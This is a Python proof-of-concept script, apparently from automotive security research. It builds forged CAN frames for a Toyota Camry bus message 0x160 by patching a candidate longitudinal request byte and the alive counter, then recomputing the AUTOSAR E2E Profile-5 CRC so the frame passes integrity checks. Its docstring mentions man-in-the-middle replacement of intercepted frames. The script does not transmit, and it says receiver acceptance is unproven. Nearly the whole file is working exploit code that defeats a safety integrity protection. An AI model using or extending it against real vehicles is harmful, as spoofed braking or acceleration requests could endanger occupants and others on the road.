#!/usr/bin/env python3
"""Offline proof-of-concept builder for the Camry native-Bus-1 0x160 request PDU.

This intentionally does not transmit CAN.  It starts from an observed 32-byte
0x160 template, changes only the candidate signed-7 request at B12 and the B2
alive counter, then recomputes the exact AUTOSAR E2E Profile-5 CRC recovered in
VAR-107.  See the standards note beside CAN_ID below for the recovered Profile-5
wire parameters used by this Toyota family.

The tool does *not* claim that B12 is the final OEM longitudinal request field
or that a downstream receiver will accept synthetic traffic.  Those remain
live/source-attribution questions.
"""
from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO))

from tools.toyota_e2e_p05 import e2e_p05_check, e2e_p05_protect

# AUTOSAR E2E Profile 5 (AUTOSAR_PRS_E2EProtocol), as recovered for the
# native Camry Bus-1 family:
#   - CRC-16/CCITT-FALSE: poly=0x1021, init=0xFFFF, refin=false,
#     refout=false, xorout=0x0000 (AUTOSAR CRC library parameters)
#   - transmitted CRC is little-endian in B0:B1
#   - B2 is the 8-bit Profile-5 counter
#   - CRC covers B2..end, then the implicit 16-bit Data ID
#   - on these Toyota PDUs, Data ID == CAN ID and is appended low byte then high byte
# The reusable implementation lives in tools/toyota_e2e_p05.py; this PoC only
# supplies the recovered 0x160 application-field semantics on top of that standard.
CAN_ID = 0x160
DLC = 32


@dataclass(frozen=True)
class RequestFrame:
    frame: bytes
    old_counter: int
    new_counter: int
    old_request_raw: int
    new_request_raw: int
    old_integrity: int
    new_integrity: int

    @property
    def request_signed7(self) -> int:
        return decode_signed7(self.new_request_raw)


def decode_signed7(raw: int) -> int:
    if not 0 <= raw <= 0x7F:
        raise ValueError(f"signed7 raw value out of range: {raw}")
    return raw - 0x80 if raw & 0x40 else raw


def encode_signed7(value: int) -> int:
    if not -64 <= value <= 63:
        raise ValueError(f"signed7 request must be in [-64, 63], got {value}")
    return value & 0x7F


def build_0x160_request(
    template: bytes,
    request_signed7: int,
    counter: int | None = None,
    *,
    advance_counter: bool = False,
) -> RequestFrame:
    """Patch an observed 0x160 template into one candidate FRC-style request frame.

    By default the observed B2 counter is preserved, which matches transparent
    MITM replacement of an intercepted frame.  ``advance_counter=True`` builds
    the next modulo-256 frame from an older template.  ``counter`` selects an
    explicit B2 value.  Only B2, B12, and B0:B1 are modified.
    """
    if len(template) != DLC:
        raise ValueError(f"0x{CAN_ID:03X} template must be {DLC} bytes, got {len(template)}")
    if not e2e_p05_check(template, CAN_ID):
        raise ValueError("template does not carry a valid recovered Profile-5 CRC for CAN ID 0x160")

    if counter is not None and advance_counter:
        raise ValueError("counter and advance_counter are mutually exclusive")

    old_counter = template[2]
    if counter is not None:
        new_counter = counter
    elif advance_counter:
        new_counter = (old_counter + 1) & 0xFF
    else:
        new_counter = old_counter
    if not 0 <= new_counter <= 0xFF:
        raise ValueError(f"counter must be in [0, 255], got {new_counter}")

    old_request = template[12]
    new_request = encode_signed7(request_signed7)
    old_integrity = int.from_bytes(template[:2], "little")

    out = bytearray(template)
    out[2] = new_counter
    out[12] = new_request
    frame = e2e_p05_protect(bytes(out), CAN_ID)
    new_integrity = int.from_bytes(frame[:2], "little")

    return RequestFrame(
        frame=frame,
        old_counter=old_counter,
        new_counter=new_counter,
        old_request_raw=old_request,
        new_request_raw=new_request,
        old_integrity=old_integrity,
        new_integrity=new_integrity,
    )


def parse_int(text: str) -> int:
    return int(text, 0)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Offline Camry FRC-style 0x160 request constructor (no CAN transmission)"
    )
    ap.add_argument("--template-hex", required=True, help="observed 32-byte 0x160 payload")
    ap.add_argument(
        "--request",
        required=True,
        type=int,
        metavar="SIGNED7",
        help="candidate B12 request in recovered signed-7 units (-64..63)",
    )
    counter_group = ap.add_mutually_exclusive_group()
    counter_group.add_argument(
        "--counter",
        type=parse_int,
        help="explicit B2 alive counter (default: preserve template counter)",
    )
    counter_group.add_argument(
        "--advance-counter",
        action="store_true",
        help="use template B2 + 1 mod 256 instead of preserving B2",
    )
    ap.add_argument("--json", action="store_true", help="emit construction metadata as JSON")
    args = ap.parse_args()

    try:
        template = bytes.fromhex(args.template_hex)
        result = build_0x160_request(
            template, args.request, args.counter, advance_counter=args.advance_counter
        )
    except ValueError as exc:
        ap.error(str(exc))

    if args.json:
        print(
            json.dumps(
                {
                    "can_id": f"0x{CAN_ID:03X}",
                    "dlc": DLC,
                    "frame_hex": result.frame.hex(),
                    "counter": {"old": result.old_counter, "new": result.new_counter},
                    "request": {
                        "old_raw": result.old_request_raw,
                        "new_raw": result.new_request_raw,
                        "new_signed7": result.request_signed7,
                    },
                    "integrity": {
                        "old": f"0x{result.old_integrity:04X}",
                        "new": f"0x{result.new_integrity:04X}",
                    },
                    "transmits_can": False,
                },
                indent=2,
            )
        )
    else:
        print(result.frame.hex())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
